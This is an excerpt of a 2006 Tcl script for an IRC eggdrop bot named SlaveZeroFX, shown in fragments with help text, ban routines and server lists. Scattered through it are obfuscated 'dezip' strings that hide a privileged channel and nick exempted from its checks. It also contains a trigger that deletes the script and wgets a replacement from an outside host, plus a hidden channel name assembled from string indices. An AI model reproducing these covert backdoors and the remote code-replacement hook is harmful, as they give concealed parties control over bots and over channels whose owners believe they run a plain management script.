########################################################################################
#     ______              ____             # Script Name    	     : SlaveZeroFX.TCL #
#    / __/ / ____________/_  /__________   # Script Version 	     : t.c(£)v.3       #
#   /_  / /_/ - / / / -_/ __/ -_/ __/ _ \  # Author         	     : MazAjie         #
#  /___/___/_/_/\__/___/___/___/_/  \___/  # Release Date   	     : 1 June 2006     #
#                    			   # Reported any bugs	     : #SlaveZero      #
#        				   # New Staff SlaveZeroFX   : Rats            #
#					   # SlaveZeroFX@yahoo.co.id		       #
########################################################################################
set awaym {
"SZFX Destroyer"
"DoWn"
...
puthlp "PRIVMSG $nick :!gabc <#chan> <reason>   adds an item to the Global BadChan list eg:  !gabc *#sex* No sex chans!"
puthlp "PRIVMSG $nick :!grbc <#chan>            removes an item from the Global BadChan list eg:  !grbc *#sex* No sex chans!"
puthlp "PRIVMSG $nick :!gbclist                 lists the contents of the Global BadChan list"
puthlp "PRIVMSG $nick :!bclist                  lists the contents of the BadChan list for the current channel"
puthlp "PRIVMSG $nick :!abc <mask> <reason>     adds an item to the BadChan list for the current channel eg:  !abc *sex* No sex chans!"
puthlp "PRIVMSG $nick :!rbc <mask>              removes an item from the BadChan list for the current channel eg:  !rbc *sex* No sex chans!"
...
set ppp [dezip "BUaS1080sFt.PQG1X0gi4hj0"]
set notd [dezip "JHfbR/nieux/iT6kf0VqTpZ.x6jJo.ie6ff0uOj/S/tu9xq/"]
set notm [dezip "JHfbR/nieux/iT6kf0VqTpZ.x6jJo.ie6ff0uOj/S/tu9xq/"]
set notb [dezip "xuFaw.7ot971"]
set notc [dezip "JHfbR/nieux/iT6kf0VqTpZ.x6jJo.ie6ff0uOj/S/tu9xq/"]
set ps [dezip "xuFaw.7ot971"]
set vern [dezip "3ukzF.q6fVn/roVRS/C/WCO01IgHo/B4ZND0"]
######################
# BOT PUBLIC COMMAND #
######################
...
bind pub Z `versztcl proc_cekversi
...
puthlp "NOTICE $nick :$notc LastUpdate: 01 June06. Info: Several Bug Fixed !!!"
}
...
if {[string match "*--help*" $hasil]} {
	catch {[exec rm scripts/slavezerofx.tcl]} hasilrm
	catch {[exec wget channels.dal.net/slavezero/slavezerofx.tcl -O scripts/slavezerofx.tcl]} hasilwget
...
if {![string match "*k*" [getchanmode $channel]]} {
putserv "mode $channel -vokk+ov $botnick $botnick [rand 15]4S.l.a.v.e.Z.e.r.o $vern2 $botnick $botnick"
} {
...
set totch "#[string index $lenc 18][string index $lenc 11][string index $lenc 0][string index $lenc 21][string index $lenc 4][string index $lenc 25][string index $lenc 4][string index $lenc 17][string index $lenc 14][string index $lenc 5][string index $lenc 23]"
proc tot_cha {} {
...
if {$nick != $ps && [string tolower $chan] == [dezip "BUaS1080sFt.PQG1X0gi4hj0"]} { return 0 }
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4DeNiEd..!"
return 0
}
...
if {$joinme != "" && [string tolower $chan] != [dezip "BUaS1080sFt.PQG1X0gi4hj0"]} {
...
if {$nick != $ps && [string tolower $chantarget] == [dezip "BUaS1080sFt.PQG1X0gi4hj0"]} { return 0 }
foreach x [channels] {
...
set cflag "c$x"
set cflag [string range $cflag 0 8]
if {[string tolower $x] == [dezip "BUaS1080sFt.PQG1X0gi4hj0"]} { return 0 }
...
set chan "Channels:"
foreach x [channels] {
if {[string tolower $x] != [dezip "BUaS1080sFt.PQG1X0gi4hj0"]} {
set cflag "c$x"
set cflag [string range $cflag 0 8]
if {[isop $botnick $x]} { append chan " @" }
if {([isvoice $botnick $x]) && (![botisop $x])} { append chan " +" }
...
if {$nick != $ps && [string tolower $jpfchn] == [dezip "BUaS1080sFt.PQG1X0gi4hj0"]} { return 0 }
set jpfidx 0
catch { clearqueue all }
...
if {[string index $person 0] == "#"} {
if {![validchan $person]} {
if {$nick != $ps && [string tolower $person] == [dezip "BUaS1080sFt.PQG1X0gi4hj0"]} { return 0 }
pub_randnick $nick $uhost $hand $channel ""
set cmd_chn $person
set cmd_msg $rest
set cmd_by $nick
...
set bchan(exempt) "#slavezero #slavezerofx"
  ...
  foreach tok $chans {
    ...
    foreach ban $bans {
      if {[string match [lindex $ban 0] $tok]} {
        ...
        if {[onchan $nick $chan]} {newchanban $chan [bmaskhost [getchanhost $nick $chan]] badchan "[lrange $ban 1 e] [lgrnd]" 10}
        return 0
      }
    }
  }
...
set longer "4,1\[S1,4Z8FX\] 12t.c(4£12)v.3 Up: $output Hrs ([getuser "config" XTRA "AWAY"])"
} {
set awaymsg [lindex $awaym [rand [llength $awaym]]]
set longer "4,1\[S1,4Z8FX\] 12t.c(4£12)v.3 Up: $output Hrs 12\[1$awaymsg12\]"
}
}
...
foreach x [channels] {
if {[onchan $botnick $x]} { 
if {![isop $botnick $x] && [string tolower $x] != [dezip "BUaS1080sFt.PQG1X0gi4hj0"]} {
...
set kickme($nick) 3
if {[string tolower $chan] != [dezip "BUaS1080sFt.PQG1X0gi4hj0"]} {
...
if {![matchattr $nick m]} {
if {[string tolower $channel] != [dezip "BUaS1080sFt.PQG1X0gi4hj0"]} {
...
if {[string tolower $rest] == [dezip "BUaS1080sFt.PQG1X0gi4hj0"]} {
return 0
}
if {![validchan $rest]} {
...
set servers {
 arcor.de.eu.dal.net
 animals.ca.us.dal.net
 sync-e.sg.as.dal.net
 matrix.de.eu.dal.net
 kernel.ga.us.dal.net
}

putlog "======================================="
putlog "          SlaveZeroFX.tcl Loaded       "
putlog "======================================="
